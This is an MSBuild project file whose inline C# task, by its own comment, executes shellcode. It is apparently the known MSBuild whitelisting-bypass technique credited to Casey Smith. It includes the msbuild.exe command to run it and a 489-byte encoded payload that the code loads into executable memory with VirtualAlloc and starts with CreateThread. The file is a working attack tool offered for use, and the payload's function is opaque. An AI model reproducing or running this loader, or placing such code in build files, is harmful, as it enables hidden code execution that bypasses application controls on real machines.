<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes shellcode. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
  <!-- Save This File And Execute The Above Command -->
  <!-- Author: Casey Smith, Twitter: @subTee --> 
  <!-- License: BSD 3-Clause -->
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
    
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {         
          private static UInt32 MEM_COMMIT = 0x1000;          
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
          [DllImport("kernel32")]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
          [DllImport("kernel32")]
            private static extern IntPtr CreateThread(            
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId           
            );
          [DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(           
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );          
          public override bool Execute()
          {
            byte[] shellcode = new byte[489] {
0xd9,0xc7,0xd9,0x74,0x24,0xf4,0xbf,0xdb,0x55,0xd2,0x82,0x5a,0x31,0xc9,0xb1,
0x74,0x83,0xc2,0x04,0x31,0x7a,0x15,0x03,0x7a,0x15,0x39,0xa0,0x6a,0x0a,0x63,
0x3a,0xeb,0xd0,0x4d,0x64,0x9f,0xc2,0x85,0xcd,0x51,0xc2,0xd4,0x9f,0xa0,0x96,
0x03,0xe3,0x01,0x12,0x28,0xa1,0x94,0xf9,0x53,0x46,0xf2,0x4b,0x74,0xaa,0xa0,
0x4b,0x4c,0x84,0x1d,0x5d,0xf7,0x3d,0xd1,0xd5,0xc7,0x09,0xcb,0x5c,0x1a,0x4f,
0x4e,0x21,0x5e,0x8d,0xb4,0xd7,0x1e,0xc6,0x13,0x63,0xdf,0x81,0x7b,0xd9,0x27,
0x9d,0xf6,0x53,0x35,0x81,0x68,0x5e,0xc0,0xcd,0xcb,0x2e,0x2a,0x56,0xdb,0x81,
0x1f,0x31,0xbf,0x12,0x4f,0xfb,0x23,0x2e,0x82,0x14,0x4c,0x27,0x1d,0x42,0x5d,
0x4a,0x64,0xe4,0x36,0x22,0x7b,0x37,0x87,0xde,0xde,0x51,0x82,0x6d,0x68,0xe6,
0xdb,0x3e,0x70,0xd6,0xfa,0xad,0x9b,0x8e,0xe6,0xb6,0xfa,0x12,0xfd,0x1d,0x52,
0x6a,0xee,0x44,0x4b,0xfa,0x82,0x56,0x08,0xef,0x68,0xb2,0xb2,0xd1,0xd4,0x56,
0x97,0x86,0xe8,0x48,0x55,0xd9,0x20,0x23,0xca,0xf2,0x0a,0x8c,0x51,0x93,0x79,
0x53,0x5b,0xe0,0x6b,0x19,0xab,0x9d,0x32,0x69,0x33,0x68,0x69,0x48,0x1e,0x38,
0xab,0xac,0x80,0x6a,0x9e,0x0a,0x3f,0xbd,0x78,0x58,0x36,0x4d,0xb0,0xc8,0xb2,
0x51,0xd0,0xff,0x40,0x66,0x8e,0xf0,0xe6,0x2f,0x78,0x53,0xa9,0x54,0x9f,0x1d,
0x0e,0x7a,0xb2,0xd9,0x45,0x04,0x4c,0x84,0xf9,0x37,0xb0,0xfd,0x87,0xbf,0xf9,
0xab,0xea,0x01,0x26,0xcf,0xe7,0xbe,0xda,0x13,0x8a,0xcf,0x36,0x52,0x2c,0x46,
0x91,0x83,0xb4,0x0f,0x97,0xd7,0x15,0x67,0x47,0x0d,0xae,0x65,0x7f,0xa8,0xfb,
0x7c,0xdd,0x01,0xc9,0x5b,0xff,0x73,0xdd,0x6a,0x25,0xa3,0x6f,0xbb,0xb3,0x15,
0x24,0xc6,0xec,0xed,0xda,0xbd,0x63,0x3a,0x40,0x1e,0x3c,0x0c,0x40,0x98,0x2c,
0x7f,0xf6,0x19,0xbe,0x0a,0x6e,0xb7,0x4b,0xb5,0x70,0x66,0x8f,0x87,0xc8,0xf9,
0x44,0xf4,0xdd,0xac,0xba,0x98,0x63,0x9e,0x85,0x22,0xdd,0xd6,0x40,0x65,0xd9,
0x46,0x91,0xb9,0xc1,0x33,0x9f,0xfb,0x6f,0xac,0x21,0x98,0xdd,0x03,0x91,0x4e,
0x12,0xe4,0xd5,0x1a,0xcd,0x26,0xc5,0x30,0x71,0x30,0x13,0x41,0x0c,0x0b,0x01,
0x18,0x56,0xd7,0x17,0x4d,0x81,0x7a,0x55,0xa8,0x94,0x79,0x80,0x85,0xa7,0x47,
0xbf,0x91,0x1f,0x2e,0xef,0x01,0x5d,0x88,0x97,0x16,0xc6,0x8e,0xdd,0x66,0x54,
0x92,0x9c,0x46,0xe6,0xb3,0xf4,0x2a,0x46,0xf6,0xf5,0xcc,0x65,0xff,0x9a,0xcc,
0x53,0x77,0xa7,0xc7,0xce,0x2c,0x48,0xee,0xa1,0xb0,0x22,0xde,0x18,0x75,0x07,
0xed,0x6e,0x32,0x85,0x50,0x0e,0x55,0xfe,0x02,0x05,0x30,0x86,0x85,0xbe,0x6b,
0x4a,0xc9,0xda,0x43,0x84,0x1d,0x7c,0x45,0xdc,0x33,0x5d,0xf6,0x34,0x87,0x5c,
0x13,0x3d,0x9b,0x5f,0xdb,0x4e,0xca,0xa9,0x51,0x06,0x94,0x45,0x47,0xeb,0xfc,
0xa9,0xb8,0xab,0x82,0x5f,0x26,0xa9,0x3d,0x22,0xaa,0xef,0xe6,0xc1,0x95,0xbb,
0xd0,0xd0,0x08,0xe1,0x46,0xc2,0x71,0x1d,0xe1 };
              
              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
              IntPtr hThread = IntPtr.Zero;
              UInt32 threadId = 0;
              IntPtr pinfo = IntPtr.Zero;
              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
              WaitForSingleObject(hThread, 0xFFFFFFFF);
              return true;
          } 
        }     
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>